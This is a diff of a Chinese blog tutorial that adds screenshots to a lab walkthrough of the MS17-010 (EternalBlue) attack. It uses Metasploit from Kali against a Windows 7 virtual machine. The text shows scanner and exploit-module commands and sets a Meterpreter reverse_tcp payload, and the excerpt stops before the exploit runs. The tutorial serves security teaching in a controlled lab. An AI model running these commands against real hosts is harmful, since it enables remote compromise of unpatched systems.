@@ -56,7 +56,7 @@ Kali 也是一个简便的安全解决方案。Kali 并不要求你自己去维�
 
 安装完成后设置好相应的分辨率。
 
- 
+ ![](https://img-blog.csdnimg.cn/20190707143511758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 Kali系统
 
@@ -67,7 +67,7 @@ Kali系统
 为了在**受控的环境下**模拟攻击过程，安装windows7虚拟机作为被攻击主机。
 
  
-
+![](https://img-blog.csdnimg.cn/20190707143533397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 Win7系统
 
 **3.****模拟使用 MS17_010 漏洞攻击**
@@ -75,14 +75,14 @@ Win7系统
 kali控制台输入：msfconsole  
 
  
-
+![](https://img-blog.csdnimg.cn/20190707143542547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
  
 
 进入metasploit框架
 
 ●寻找MS17_010漏洞： **search ms17_010**
 
- 
+ ![](https://img-blog.csdnimg.cn/20190707143553851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 找寻漏洞
 
@@ -94,14 +94,14 @@ kali控制台输入：msfconsole  
 
 ●输入命令：use auxiliary/scanner/smb/smb_ms17_010
 
- 
+ ![](https://img-blog.csdnimg.cn/20190707143606438.png)
 
  
 
 ●查看这个模块需要配置的信息：show options
 
  
-
+![](https://img-blog.csdnimg.cn/20190707143627738.png)
  
 
 RHOSTS 参数是要探测主机的ip或ip范围，
@@ -118,27 +118,26 @@ RHOSTS 参数是要探测主机的ip或ip范围，
 
  
 
- 
+ ![](https://img-blog.csdnimg.cn/20190707143633105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 ●然后关闭win7的防火墙：
 
- 
+  ![](https://img-blog.csdnimg.cn/20190707143637718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 关闭防火墙
 
- 
+  ![](https://img-blog.csdnimg.cn/20190707143641202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 ●查看win7的ip地址：192.168.163.130
 
- 
 
 ●尝试win7 ping kali：
 
- 
+  ![](https://img-blog.csdnimg.cn/2019070714365546.png)
 
 ●用kali ping win7：
 
- 
+  ![]()
 
  
 
@@ -156,7 +155,7 @@ RHOSTS 参数是要探测主机的ip或ip范围，
 
 **exploit**
 
- 
+  ![](https://img-blog.csdnimg.cn/20190707143701584.png)
 
 这里有+号的就是可能存在漏洞的主机。【可能是因为我把win7防火墙关了】
 
@@ -174,15 +173,17 @@ RHOSTS 参数是要探测主机的ip或ip范围，
 
 ●查看这个漏洞的信息：info
 
- 
+  ![](https://img-blog.csdnimg.cn/20190707143708263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 ●查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统：show targets
 
- 
+  ![](https://img-blog.csdnimg.cn/20190707143713194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 ●查看攻击载荷：show  payloads
+ ![](https://img-blog.csdnimg.cn/20190707143719583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 ●设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp
+ ![](https://img-blog.csdnimg.cn/20190707143738151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9jaGVuemh1by5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70)
 
 ●查看模块需要配置的参数： show  options
 
